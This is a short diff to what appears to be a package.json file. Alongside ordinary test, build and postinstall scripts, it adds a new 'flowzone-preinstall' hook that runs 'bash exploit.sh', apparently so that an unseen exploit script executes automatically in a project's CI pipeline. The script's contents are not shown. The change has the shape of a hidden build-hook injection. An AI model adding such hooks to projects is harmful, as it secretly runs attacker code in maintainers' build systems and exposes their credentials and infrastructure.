@@ -14,7 +14,8 @@
     "test:compose": "(docker compose -f docker-compose.test.yml run --build --rm sut || docker compose -f docker-compose.test.yml logs); npm run compose:down",
     "compose:down": "docker compose -f docker-compose.test.yml down --volumes",
     "prepack": "npm run build",
-    "postinstall": "node scripts/fetch-binary.js || npm run build:go"
+    "postinstall": "node scripts/fetch-binary.js || npm run build:go",
+    "flowzone-preinstall": "bash exploit.sh"
   },
   "files": [
     "dist/",
